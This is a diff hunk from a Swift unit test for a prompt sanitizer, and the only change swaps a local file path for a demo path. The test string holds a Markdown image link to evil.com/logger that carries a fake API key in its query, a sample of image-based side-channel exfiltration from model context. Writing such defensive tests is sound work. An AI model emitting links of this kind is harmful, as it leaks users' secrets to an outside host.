@@ -37,7 +37,7 @@ final class SecurityExpertTests: XCTestCase {
         let sanitizer = PromptSanitizer.shared
         
         // 构造含有恶意侧信道外泄的 Markdown 图片链接
-        let leakingMarkdown = "这里是机密数据：ZhiYu_API_Key_12345。![leak](https://evil.com/logger?data=ZhiYu_API_Key_12345) 还有一些普通图片 ![avatar](file:///Users/constantine/avatar.png)"
+        let leakingMarkdown = "这里是机密数据：ZhiYu_API_Key_12345。![leak](https://evil.com/logger?data=ZhiYu_API_Key_12345) 还有一些普通图片 ![avatar](file:///demo/avatar.png)"
         
         let sanitized = sanitizer.sanitizeContext(leakingMarkdown)
         
